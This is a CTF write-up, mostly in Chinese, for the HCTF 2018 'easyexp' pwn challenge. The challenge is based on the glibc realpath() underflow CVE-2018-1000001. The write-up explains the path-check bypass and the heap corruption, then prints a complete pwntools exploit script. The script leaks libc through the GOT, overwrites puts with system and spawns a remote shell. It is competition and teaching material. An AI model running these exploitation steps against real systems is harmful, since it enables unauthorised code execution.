## HCTF 2018 - PWN - easyexp

#### 出题思路：

来自CVE–2018–1000001，glibc的`realpath()`缓冲区下溢漏洞，具体的漏洞原理我就不分析了看后面贴出的参考链接吧，菜鸡出题连别人的exp都看不懂，只能把问题简化，变成这道没啥营养的easyexp了2333不过意外的做出的人少呢，可能不少人没找到门道(没兴趣)吧。

参考链接：https://www.freebuf.com/column/162202.html

#### 解题思路：

发现出题人在原CVE的exp里抄袭了关于`通过改变当前目录到另一个挂载的用户空间`来实现让`getcwd()`返回的字符串前加上`(unreachable)`的相关代码，直接就可以利用题目里的`canonicalize_file_name()`在堆上进行修改，但需要注意的是这里必须要bypass `realpath()`中关于检查解析出来的路径是否正确的相关代码，否则一旦`canonicalize_file_name`返回NULL，程序就会直接退出。调试可以发现程序是在调用`__lxstat64()`后返回NULL的，不知道这个函数的可以搜一下，大致就是获取文件属性，返回NULL的原因也很简单，因为找不到名为(unreachable)/tmp的文件

这里有两种方法解决这个问题：

1.程序初始化时会创建用户目录，并在里面创建假flag，所以考虑创建`(unreachable)`用户目录，在里面创建/tmp文件就可以通过检查

2.由于题目部署在docker中，进程的pid都不会很大，可以爆破，直接在`../../proc/childpid/cwd`中创建`(unreachable)/tmp`之后就可以通过检查

程序和堆有关的部分就是文件的cache系统，新创建文件时or读取文件内容时会把文件读入缓存中，缓存中的文件不需要open文件，在一段时间不使用后就会被释放掉并把之前的内容写入文件中

这样创建带有`/`的文件时，堆上就会有/出现

通过`mkdir ../../aaaaaa`这样的形式就可以修改堆了，详细的直接看exp好了：

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./easyexp')
	bin = ELF('./easyexp')
	libc = ELF('./libc.so.6')
	#libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
else:
	cn = remote('150.109.46.159',20004)
	bin = ELF('./easyexp')
	libc = ELF('./libc.so.6')
	cn.sendlineafter('token','Okxa47uIRWgnQCdtAUIQMBbowEZFOSIb')


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

def cat(path):
	cn.sendlineafter('$ ',"cat " + path)

def mkdir(path):
	cn.sendlineafter('$ ',"mkdir " + path)

def mkfile(path,content):
	cn.sendlineafter('$ ',"mkfile " + path)
	cn.sendlineafter('write something',content)

def fake(path):
	padding = '../../'
	zero = []
	for i in range(0,len(path)):
		if ord(path[i]) == 0:
			zero.append(i)
			padding += 'a'
		else:
			padding += path[i]
	mkdir(padding)
	zero = zero[::-1]
	for i in zero:
		padding = padding[0:i+6]
		mkdir(padding)

fbuf_base = 0x603180
target = fbuf_base + 0x60 * 1

cn.sendlineafter('input your home\'s name:','(unreachable)')

buf = p64(0) + p64(0xf1) + p64(target-0x18) + p64(target-0x10)
buf = buf.ljust(0xf0-2,'\x00')
buf+= '/'

mkfile('./(unreachable)/tmp','/'* 0x20)
mkfile('chunk2','a' * 0x20)

buf = p64(66) + p64(0x31)+ p64(66) + p64(0x51) + p64(target - 0x18) + p64(target - 0x10)
fake(buf)

mkfile('chunk3','/' * 0x20)
mkfile('newchunk1','a' * 0xf0)

fake(p64(0x50))

cat('chunk3')

mkfile('unlink','/bin/sh')

buf = 'a' * 0x18 + p64(target)
mkfile('chunk2',buf)

buf = p64(target) + p32(0x100)[:-1]
mkfile('chunk2',buf)

buf = p64(target) + p32(0x100) + 'chunk2\x00'
buf = buf.ljust(0x60,'\x00')
buf+= p64(bin.got['puts'])
mkfile('chunk2',buf)

cat('chunk3')
lbase = u64(cn.recvline()[:-1].ljust(8,'\x00')) - libc.sym['puts']
print('lbase:' + hex(lbase))

mkfile('chunk2',p64(bin.got['puts']))
mkfile('chunk2',p64(lbase + libc.sym['system']))

cat('unlink')

cn.interactive()
```

